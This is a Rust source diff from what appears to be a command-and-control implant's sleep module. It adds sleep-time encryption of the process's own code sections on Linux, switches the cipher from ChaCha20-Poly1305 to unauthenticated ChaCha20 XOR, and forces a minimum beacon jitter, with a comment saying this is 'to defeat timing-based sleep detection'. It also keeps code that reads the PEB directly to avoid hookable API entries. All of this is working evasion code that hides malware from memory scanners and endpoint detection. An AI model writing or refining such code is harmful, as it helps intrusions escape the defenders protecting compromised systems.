@@ -1,10 +1,7 @@
 use common::config::SleepConfig;
-#[cfg(windows)]
 use anyhow::Result;
-#[cfg(windows)]
 use common::config::SleepMethod;
 use log::debug;
-#[cfg(windows)]
 use log::info;
 use rand::{thread_rng, Rng};
 
@@ -54,7 +51,8 @@ pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
         }
     }
     let mut rng = thread_rng();
-    let jitter_frac = (config.jitter_percent as f64) / 100.0;
+    // Enforce a minimum of ±20% jitter to defeat timing-based sleep detection.
+    let jitter_frac = ((config.jitter_percent as f64) / 100.0).max(0.20);
     let jitter_val = base * jitter_frac;
     let offset = rng.gen_range(-jitter_val..=jitter_val);
     std::time::Duration::from_secs_f64((base + offset).max(1.0))
@@ -122,49 +120,113 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
     }
 }
 
+/// Non-Windows sleep-time memory encryption.
+/// Encrypts executable sections before sleeping and decrypts on wake.
+#[cfg(not(windows))]
+pub fn execute_sleep(duration: std::time::Duration, _method: &SleepMethod) -> Result<()> {
+    info!("Sleep-time memory encryption active for {:?}", duration);
+    crypto::encrypt_sections();
+    std::thread::sleep(duration);
+    crypto::decrypt_sections();
+    Ok(())
+}
+
 pub mod crypto {
-    use chacha20poly1305::{
-        aead::{Aead, KeyInit},
-        ChaCha20Poly1305, Nonce,
-    };
+    use chacha20::ChaCha20;
+    use chacha20::cipher::{KeyIvInit, StreamCipher};
     use rand::RngCore;
 
+    /// A section whose bytes have been XOR-encrypted in-place with a ChaCha20
+    /// keystream.  The `nonce` is the only per-section state needed to decrypt;
+    /// the 32-byte session key lives on the separate key page.
     struct EncryptedSection {
         addr: *mut u8,
         size: usize,
-        // Windows: PAGE_* constants. Unix: libc::PROT_* flags stored as u32.
+        /// Windows: PAGE_* constant. Unix: libc::PROT_* flags stored as u32.
         orig_prot: u32,
-        // nonce (12) + ciphertext + tag (16)
-        encrypted_blob: Vec<u8>,
+        /// Per-section ChaCha20 nonce (12 bytes).
+        nonce: [u8; 12],
     }
 
     thread_local! {
-        static SESSION_KEY: std::cell::RefCell<[u8; 32]> = const { std::cell::RefCell::new([0; 32]) };
-        // Set to true after a successful encrypt_sections() so decrypt_sections()
-        // can refuse to run with a zero key.
-        static SESSION_INITIALIZED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
-        static ENCRYPTED_SECTIONS: std::cell::RefCell<Vec<EncryptedSection>> = const { std::cell::RefCell::new(Vec::new()) };
+        /// Pointer to the mmap/VirtualAlloc'd key page.  Null when no session
+        /// is active.  The key is stored at offset 0, 32 bytes long, on a page
+        /// that is *not* part of the encrypted sections.
+        static KEY_PAGE: std::cell::Cell<*mut u8> =
+            const { std::cell::Cell::new(std::ptr::null_mut()) };
+        static KEY_PAGE_LEN: std::cell::Cell<usize> =
+            const { std::cell::Cell::new(0) };
+        static SESSION_INITIALIZED: std::cell::Cell<bool> =
+            const { std::cell::Cell::new(false) };
+        static ENCRYPTED_SECTIONS: std::cell::RefCell<Vec<EncryptedSection>> =
+            const { std::cell::RefCell::new(Vec::new()) };
     }
 
-    fn wipe_vec_volatile(buf: &mut Vec<u8>) {
-        for b in buf.iter_mut() {
-            unsafe { std::ptr::write_volatile(b, 0u8) };
+    // ── Key-page allocation / deallocation ───────────────────────────────
+
+    /// Allocate a private anonymous page to hold the 32-byte session key.
+    /// Returns (ptr, length) or (null, 0) on failure.
+    #[cfg(not(windows))]
+    unsafe fn alloc_key_page() -> (*mut u8, usize) {
+        let page_size = libc::sysconf(libc::_SC_PAGESIZE);
+        let page_size = if page_size > 0 { page_size as usize } else { 4096 };
+        let ptr = libc::mmap(
+            std::ptr::null_mut(),
+            page_size,
+            libc::PROT_READ | libc::PROT_WRITE,
+            libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
+            -1,
+            0,
+        );
+        if ptr == libc::MAP_FAILED {
+            log::error!("alloc_key_page: mmap failed: {}", std::io::Error::last_os_error());
+            return (std::ptr::null_mut(), 0);
         }
-        let mut to_drop = Vec::new();
-        std::mem::swap(buf, &mut to_drop);
-        drop(to_drop);
+        (ptr as *mut u8, page_size)
     }
 
-    fn clear_encrypted_sections() {
-        ENCRYPTED_SECTIONS.with(|sections| {
-            let mut sections = sections.borrow_mut();
-            for section in sections.iter_mut() {
-                wipe_vec_volatile(&mut section.encrypted_blob);
-            }
-            sections.clear();
-            sections.shrink_to_fit();
-        });
+    #[cfg(windows)]
+    unsafe fn alloc_key_page() -> (*mut u8, usize) {
+        use winapi::um::memoryapi::VirtualAlloc;
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        let page_size = 4096usize;
+        let ptr = VirtualAlloc(
+            std::ptr::null_mut(),
+            page_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+        if ptr.is_null() {
+            log::error!("alloc_key_page: VirtualAlloc failed: {}", std::io::Error::last_os_error());
+            return (std::ptr::null_mut(), 0);
+        }
+        (ptr as *mut u8, page_size)
     }
+
+    /// Zero the key bytes on the page, then release the page.
+    #[cfg(not(windows))]
+    unsafe fn free_key_page(page: *mut u8, len: usize) {
+        if !page.is_null() && len > 0 {
+            // Volatile zero to prevent the optimizer from eliding it.
+            std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
+            libc::munmap(page as *mut libc::c_void, len);
+        }
+    }
+
+    #[cfg(windows)]
+    unsafe fn free_key_page(page: *mut u8, len: usize) {
+        let _ = len;
+        if !page.is_null() {
+            std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
+            winapi::um::memoryapi::VirtualFree(
+                page as *mut winapi::ctypes::c_void,
+                0,
+                winapi::um::winnt::MEM_RELEASE,
+            );
+        }
+    }
+
+    // ── Memory-protection helpers ─────────────────────────────────────────
 
     #[cfg(windows)]
     unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
@@ -182,10 +244,8 @@ pub mod crypto {
             );
             if status != 0 {
                 log::error!(
-                    "NtProtectVirtualMemory failed for {:p} (size={}) with status {}",
-                    addr,
-                    size,
-                    status
+                    "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
+                    addr, size, status
                 );
                 return false;
             }
@@ -196,8 +256,7 @@ pub mod crypto {
             if winapi::um::memoryapi::VirtualProtect(base_addr, region_size, new_protect, old_protect) == 0 {
                 log::error!(
                     "VirtualProtect failed for {:p} (size={}): {}",
-                    addr,
-                    size,
+                    addr, size,
                     std::io::Error::last_os_error()
                 );
                 return false;
@@ -215,14 +274,15 @@ pub mod crypto {
         if libc::mprotect(aligned as *mut libc::c_void, aligned_size, prot) != 0 {
             log::error!(
                 "mprotect failed for {:p} (size={}): {}",
-                addr,
-                size,
+                addr, size,
                 std::io::Error::last_os_error()
             );
             return false;
         }
         true
     }
+
+    // ── Section discovery ─────────────────────────────────────────────────
 
     #[cfg(windows)]
     unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
@@ -232,8 +292,6 @@ pub mod crypto {
         };
 
         let mut sections = Vec::new();
-        // M-26 Part G: read PEB.ImageBaseAddress directly instead of going
-        // through the hookable GetModuleHandleA IAT entry.
         #[cfg(target_arch = "x86_64")]
         let base: *mut winapi::shared::minwindef::HINSTANCE__ = {
             let teb: usize;
@@ -280,13 +338,10 @@ pub mod crypto {
         sections
     }
 
+    /// Parse /proc/self/maps to find executable and read-only sections belonging
+    /// to the current binary.  Returns (addr, size, original_prot) tuples.
     #[cfg(not(windows))]
     unsafe fn get_code_sections() -> Vec<(*mut u8, usize, i32)> {
-        // Parse /proc/self/maps to locate executable (r-xp) and read-only (r--p)
-        // memory regions that belong to the current binary.
-        // Returns (addr, size, original_prot) so decrypt_sections can restore the
-        // exact original protection instead of blindly using PROT_READ|PROT_EXEC
-        // on all regions, which breaks .rodata / .data sections (L-03 fix).
         use std::io::{BufRead, BufReader};
         let exe_path = match std::env::current_exe() {
             Ok(p) => p.to_string_lossy().to_string(),
@@ -298,7 +353,6 @@ pub mod crypto {
         };
         let mut sections = Vec::new();
         for line in BufReader::new(f).lines().map_while(Result::ok) {
-            // Format: <start>-<end> <perms> <offset> <dev> <inode> [pathname]
             if !line.contains("r-xp") && !line.contains("r--p") {
                 continue;
             }
@@ -306,35 +360,24 @@ pub mod crypto {
                 continue;
             }
             let mut fields = line.split_whitespace();
-            let addr_range = match fields.next() {
-                Some(r) => r,
-                None => continue,
-            };
-            let perms = match fields.next() {
-                Some(p) => p,
-                None => continue,
-            };
-            // Convert perms string to libc PROT_* flags
+            let addr_range = match fields.next() { Some(r) => r, None => continue };
+            let perms = match fields.next() { Some(p) => p, None => continue };
             let orig_prot = {
                 let exec = perms.as_bytes().get(2).copied() == Some(b'x');
-                if exec {
-                    libc::PROT_READ | libc::PROT_EXEC
-                } else {
-                    libc::PROT_READ
-                }
+                if exec { libc::PROT_READ | libc::PROT_EXEC } else { libc::PROT_READ }
             };
             let mut parts = addr_range.splitn(2, '-');
             let start_hex = parts.next().unwrap_or("0");
             let end_hex = parts.next().unwrap_or("0");
             let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
-            let end = usize::from_str_radix(end_hex, 16).unwrap_or(0);
-            if start == 0 || end <= start {
-                continue;
-            }
+            let end   = usize::from_str_radix(end_hex,   16).unwrap_or(0);
+            if start == 0 || end <= start { continue; }
             sections.push((start as *mut u8, end - start, orig_prot));
         }
         sections
     }
+
+    // ── Core encrypt / decrypt (Windows) ─────────────────────────────────
 
     #[cfg(windows)]
     pub fn encrypt_sections() {
@@ -346,73 +389,88 @@ pub mod crypto {
 
         #[cfg(not(feature = "memory-guard"))]
         unsafe {
-            clear_encrypted_sections();
+            ENCRYPTED_SECTIONS.with(|s| { s.borrow_mut().clear(); });
             SESSION_INITIALIZED.with(|c| c.set(false));
 
+            // Allocate a separate page to hold the session key.
+            let (kp, kplen) = alloc_key_page();
+            if kp.is_null() {
+                log::error!("encrypt_sections: failed to allocate key page — aborting");
+                return;
+            }
+
+            // Generate a 32-byte random key and write it to the key page.
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
-            SESSION_KEY.with(|k| {
-                *k.borrow_mut() = key;
-            });
+            std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+
+            KEY_PAGE.with(|c| c.set(kp));
+            KEY_PAGE_LEN.with(|c| c.set(kplen));
 
             let mut encrypted_count = 0usize;
-
             for (addr, size) in get_code_sections() {
-                if addr.is_null() || size == 0 {
-                    continue;
-                }
+                if addr.is_null() || size == 0 { continue; }
 
                 let mut old_protect = 0u32;
                 if !protect_region(addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect) {
                     continue;
                 }
 
+                // Generate a fresh per-section nonce.
                 let mut nonce_bytes = [0u8; 12];
                 rand::thread_rng().fill_bytes(&mut nonce_bytes);
-                let cipher = ChaCha20Poly1305::new((&key).into());
-                let plaintext = std::slice::from_raw_parts(addr, size);
 
-                match cipher.encrypt(Nonce::from_slice(&nonce_bytes), plaintext) {
-                    Ok(mut ciphertext_and_tag) => {
-                        let mut encrypted_blob = Vec::with_capacity(12 + ciphertext_and_tag.len());
-                        encrypted_blob.extend_from_slice(&nonce_bytes);
-                        encrypted_blob.append(&mut ciphertext_and_tag);
+                // Read key from the key page, XOR the section in-place.
+                let mut key_copy = [0u8; 32];
+                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
+                {
+                    let mut cipher = ChaCha20::new(
+                        chacha20::Key::from_slice(&key_copy),
+                        chacha20::Nonce::from_slice(&nonce_bytes),
+                    );
+                    cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+                }
+                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
 
-                        // Remove plaintext from code pages before switching to NOACCESS.
-                        std::ptr::write_bytes(addr, 0, size);
-
-                        let mut temp = 0u32;
-                        if !protect_region(addr, size, winapi::um::winnt::PAGE_NOACCESS, &mut temp) {
-                            let _ = protect_region(addr, size, old_protect, &mut temp);
-                            wipe_vec_volatile(&mut encrypted_blob);
-                        } else {
-                            ENCRYPTED_SECTIONS.with(|sections| {
-                                sections.borrow_mut().push(EncryptedSection {
-                                    addr,
-                                    size,
-                                    orig_prot: old_protect,
-                                    encrypted_blob,
-                                });
-                            });
-                            encrypted_count += 1;
-                        }
-                    }
-                    Err(e) => {
-                        log::error!(
-                            "encrypt_sections: AEAD encryption failed for section {:p}: {}",
-                            addr,
-                            e
+                // Lock the section down to NOACCESS.
+                let mut temp = 0u32;
+                if !protect_region(addr, size, winapi::um::winnt::PAGE_NOACCESS, &mut temp) {
+                    // Could not lock — undo the XOR so the section is sane again.
+                    if protect_region(addr, size, old_protect, &mut temp) {
+                        let mut key_copy2 = [0u8; 32];
+                        std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
+                        let mut cipher2 = ChaCha20::new(
+                            chacha20::Key::from_slice(&key_copy2),
+                            chacha20::Nonce::from_slice(&nonce_bytes),
                         );
-                        let mut temp = 0u32;
-                        let _ = protect_region(addr, size, old_protect, &mut temp);
+                        cipher2.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+                        std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                     }
+                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                    continue;
                 }
 
+                ENCRYPTED_SECTIONS.with(|s| {
+                    s.borrow_mut().push(EncryptedSection {
+                        addr,
+                        size,
+                        orig_prot: old_protect,
+                        nonce: nonce_bytes,
+                    });
+                });
                 std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                encrypted_count += 1;
             }
 
-            SESSION_INITIALIZED.with(|c| c.set(encrypted_count > 0));
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+            if encrypted_count > 0 {
+                SESSION_INITIALIZED.with(|c| c.set(true));
+            } else {
+                // Nothing was encrypted — release the key page now.
+                free_key_page(kp, kplen);
+                KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
+                KEY_PAGE_LEN.with(|c| c.set(0));
+            }
         }
     }
 
@@ -427,161 +485,135 @@ pub mod crypto {
         #[cfg(not(feature = "memory-guard"))]
         unsafe {
             if !SESSION_INITIALIZED.with(|c| c.get()) {
-                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping to avoid garbage write");
+                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                 return;
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
 
-            let mut key = [0u8; 32];
-            SESSION_KEY.with(|k| {
-                key = *k.borrow();
-                *k.borrow_mut() = [0u8; 32];
-            });
+            let kp    = KEY_PAGE.with(|c| c.get());
+            let kplen = KEY_PAGE_LEN.with(|c| c.get());
 
-            let mut sections = ENCRYPTED_SECTIONS.with(|sections| std::mem::take(&mut *sections.borrow_mut()));
-            for section in sections.iter_mut() {
-                if section.addr.is_null() || section.size == 0 {
-                    wipe_vec_volatile(&mut section.encrypted_blob);
-                    continue;
-                }
+            let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
+            for mut section in sections {
+                if section.addr.is_null() || section.size == 0 { continue; }
 
                 let mut rw_prev = 0u32;
-                if !protect_region(
-                    section.addr,
-                    section.size,
-                    winapi::um::winnt::PAGE_READWRITE,
-                    &mut rw_prev,
-                ) {
-                    wipe_vec_volatile(&mut section.encrypted_blob);
+                if !protect_region(section.addr, section.size, winapi::um::winnt::PAGE_READWRITE, &mut rw_prev) {
+                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
                     continue;
                 }
 
-                if section.encrypted_blob.len() < 12 + 16 {
-                    log::error!(
-                        "decrypt_sections: malformed encrypted blob for section {:p}",
-                        section.addr
+                // XOR the section again with the same key+nonce to decrypt in-place.
+                let mut key_copy = [0u8; 32];
+                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
+                {
+                    let mut cipher = ChaCha20::new(
+                        chacha20::Key::from_slice(&key_copy),
+                        chacha20::Nonce::from_slice(&section.nonce),
                     );
-                    let mut tmp = 0u32;
-                    let _ = protect_region(section.addr, section.size, winapi::um::winnt::PAGE_NOACCESS, &mut tmp);
-                    wipe_vec_volatile(&mut section.encrypted_blob);
-                    continue;
+                    cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.size));
                 }
+                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
+                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
 
-                let cipher = ChaCha20Poly1305::new((&key).into());
-                let nonce = Nonce::from_slice(&section.encrypted_blob[..12]);
-                let ciphertext_with_tag = &section.encrypted_blob[12..];
-
-                match cipher.decrypt(nonce, ciphertext_with_tag) {
-                    Ok(mut plaintext) => {
-                        if plaintext.len() != section.size {
-                            log::error!(
-                                "decrypt_sections: plaintext length mismatch for section {:p} (got {}, expected {})",
-                                section.addr,
-                                plaintext.len(),
-                                section.size
-                            );
-                            let mut tmp = 0u32;
-                            let _ = protect_region(section.addr, section.size, winapi::um::winnt::PAGE_NOACCESS, &mut tmp);
-                        } else {
-                            std::ptr::copy_nonoverlapping(
-                                plaintext.as_ptr(),
-                                section.addr,
-                                section.size,
-                            );
-
-                            let mut restore_prev = 0u32;
-                            let _ = protect_region(section.addr, section.size, section.orig_prot, &mut restore_prev);
-                        }
-
-                        for b in plaintext.iter_mut() {
-                            std::ptr::write_volatile(b, 0u8);
-                        }
-                    }
-                    Err(e) => {
-                        log::error!(
-                            "decrypt_sections: authentication failed for section {:p}: {}",
-                            section.addr,
-                            e
-                        );
-                        // Keep section inaccessible if authentication fails.
-                        let mut tmp = 0u32;
-                        let _ = protect_region(section.addr, section.size, winapi::um::winnt::PAGE_NOACCESS, &mut tmp);
-                    }
-                }
-
-                wipe_vec_volatile(&mut section.encrypted_blob);
+                let mut restore_prev = 0u32;
+                let _ = protect_region(section.addr, section.size, section.orig_prot, &mut restore_prev);
             }
 
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+            // Zero and release the key page.
+            free_key_page(kp, kplen);
+            KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
+            KEY_PAGE_LEN.with(|c| c.set(0));
         }
     }
+
+    // ── Core encrypt / decrypt (Linux / non-Windows) ──────────────────────
 
     #[cfg(not(windows))]
     pub fn encrypt_sections() {
         unsafe {
-            clear_encrypted_sections();
+            ENCRYPTED_SECTIONS.with(|s| { s.borrow_mut().clear(); });
             SESSION_INITIALIZED.with(|c| c.set(false));
 
+            // Allocate a private anonymous page to hold the session key.
+            // This page is not part of any executable section and will not be
+            // included in the XOR pass.
+            let (kp, kplen) = alloc_key_page();
+            if kp.is_null() {
+                log::error!("encrypt_sections: failed to allocate key page — aborting");
+                return;
+            }
+
+            // Generate random 32-byte key and write to key page.
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
-            SESSION_KEY.with(|k| {
-                *k.borrow_mut() = key;
-            });
+            std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+
+            KEY_PAGE.with(|c| c.set(kp));
+            KEY_PAGE_LEN.with(|c| c.set(kplen));
 
             let mut encrypted_count = 0usize;
             for (addr, size, orig_prot) in get_code_sections() {
-                if addr.is_null() || size == 0 {
-                    continue;
-                }
+                if addr.is_null() || size == 0 { continue; }
 
+                // Make region writable so we can XOR it in-place.
                 if !protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
                     continue;
                 }
 
+                // Generate a fresh per-section nonce.
                 let mut nonce_bytes = [0u8; 12];
                 rand::thread_rng().fill_bytes(&mut nonce_bytes);
-                let cipher = ChaCha20Poly1305::new((&key).into());
-                let plaintext = std::slice::from_raw_parts(addr, size);
 
-                match cipher.encrypt(Nonce::from_slice(&nonce_bytes), plaintext) {
-                    Ok(mut ciphertext_and_tag) => {
-                        let mut encrypted_blob = Vec::with_capacity(12 + ciphertext_and_tag.len());
-                        encrypted_blob.extend_from_slice(&nonce_bytes);
-                        encrypted_blob.append(&mut ciphertext_and_tag);
+                // Read key from the key page, XOR the section in-place.
+                let mut key_copy = [0u8; 32];
+                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
+                {
+                    let mut cipher = ChaCha20::new(
+                        chacha20::Key::from_slice(&key_copy),
+                        chacha20::Nonce::from_slice(&nonce_bytes),
+                    );
+                    cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+                }
+                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
 
-                        // Remove plaintext from memory before setting PROT_NONE.
-                        std::ptr::write_bytes(addr, 0, size);
-
-                        if !protect_region(addr, size, libc::PROT_NONE) {
-                            let _ = protect_region(addr, size, orig_prot);
-                            wipe_vec_volatile(&mut encrypted_blob);
-                        } else {
-                            ENCRYPTED_SECTIONS.with(|sections| {
-                                sections.borrow_mut().push(EncryptedSection {
-                                    addr,
-                                    size,
-                                    orig_prot: orig_prot as u32,
-                                    encrypted_blob,
-                                });
-                            });
-                            encrypted_count += 1;
-                        }
-                    }
-                    Err(e) => {
-                        log::error!(
-                            "encrypt_sections: AEAD encryption failed for section {:p}: {}",
-                            addr,
-                            e
+                // Lock the section to PROT_NONE.
+                if !protect_region(addr, size, libc::PROT_NONE) {
+                    // Could not lock — undo XOR so the section stays consistent.
+                    if protect_region(addr, size, orig_prot) {
+                        let mut key_copy2 = [0u8; 32];
+                        std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
+                        let mut cipher2 = ChaCha20::new(
+                            chacha20::Key::from_slice(&key_copy2),
+                            chacha20::Nonce::from_slice(&nonce_bytes),
                         );
-                        let _ = protect_region(addr, size, orig_prot);
+                        cipher2.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
+                        std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                     }
+                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                    continue;
                 }
 
+                ENCRYPTED_SECTIONS.with(|s| {
+                    s.borrow_mut().push(EncryptedSection {
+                        addr,
+                        size,
+                        orig_prot: orig_prot as u32,
+                        nonce: nonce_bytes,
+                    });
+                });
                 std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
+                encrypted_count += 1;
             }
 
-            SESSION_INITIALIZED.with(|c| c.set(encrypted_count > 0));
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+            if encrypted_count > 0 {
+                SESSION_INITIALIZED.with(|c| c.set(true));
+            } else {
+                free_key_page(kp, kplen);
+                KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
+                KEY_PAGE_LEN.with(|c| c.set(0));
+            }
         }
     }
 
@@ -594,77 +626,39 @@ pub mod crypto {
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
 
-            let mut key = [0u8; 32];
-            SESSION_KEY.with(|k| {
-                key = *k.borrow();
-                *k.borrow_mut() = [0u8; 32];
-            });
+            let kp    = KEY_PAGE.with(|c| c.get());
+            let kplen = KEY_PAGE_LEN.with(|c| c.get());
 
-            let mut sections = ENCRYPTED_SECTIONS.with(|sections| std::mem::take(&mut *sections.borrow_mut()));
-            for section in sections.iter_mut() {
-                if section.addr.is_null() || section.size == 0 {
-                    wipe_vec_volatile(&mut section.encrypted_blob);
+            let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
+            for mut section in sections {
+                if section.addr.is_null() || section.size == 0 { continue; }
+
+                if !protect_region(section.addr, section.size, libc::PROT_READ | libc::PROT_WRITE) {
+                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
                     continue;
                 }
 
-                if !protect_region(section.addr, section.size, libc::PROT_READ | libc::PROT_WRITE)
+                // XOR the section again with the same key+nonce to recover plaintext.
+                let mut key_copy = [0u8; 32];
+                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                 {
-                    wipe_vec_volatile(&mut section.encrypted_blob);
-                    continue;
-                }
-
-                if section.encrypted_blob.len() < 12 + 16 {
-                    log::error!(
-                        "decrypt_sections: malformed encrypted blob for section {:p}",
-                        section.addr
+                    let mut cipher = ChaCha20::new(
+                        chacha20::Key::from_slice(&key_copy),
+                        chacha20::Nonce::from_slice(&section.nonce),
                     );
-                    let _ = protect_region(section.addr, section.size, libc::PROT_NONE);
-                    wipe_vec_volatile(&mut section.encrypted_blob);
-                    continue;
+                    cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.size));
                 }
+                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
+                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
 
-                let cipher = ChaCha20Poly1305::new((&key).into());
-                let nonce = Nonce::from_slice(&section.encrypted_blob[..12]);
-                let ciphertext_with_tag = &section.encrypted_blob[12..];
-
-                match cipher.decrypt(nonce, ciphertext_with_tag) {
-                    Ok(mut plaintext) => {
-                        if plaintext.len() != section.size {
-                            log::error!(
-                                "decrypt_sections: plaintext length mismatch for section {:p} (got {}, expected {})",
-                                section.addr,
-                                plaintext.len(),
-                                section.size
-                            );
-                            let _ = protect_region(section.addr, section.size, libc::PROT_NONE);
-                        } else {
-                            std::ptr::copy_nonoverlapping(
-                                plaintext.as_ptr(),
-                                section.addr,
-                                section.size,
-                            );
-                            let _ = protect_region(section.addr, section.size, section.orig_prot as i32);
-                        }
-
-                        for b in plaintext.iter_mut() {
-                            std::ptr::write_volatile(b, 0u8);
-                        }
-                    }
-                    Err(e) => {
-                        log::error!(
-                            "decrypt_sections: authentication failed for section {:p}: {}",
-                            section.addr,
-                            e
-                        );
-                        // Keep section inaccessible if authentication fails.
-                        let _ = protect_region(section.addr, section.size, libc::PROT_NONE);
-                    }
-                }
-
-                wipe_vec_volatile(&mut section.encrypted_blob);
+                // Restore the original page protection.
+                let _ = protect_region(section.addr, section.size, section.orig_prot as i32);
             }
 
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+            // Zero and release the key page.
+            free_key_page(kp, kplen);
+            KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
+            KEY_PAGE_LEN.with(|c| c.set(0));
         }
     }
 }
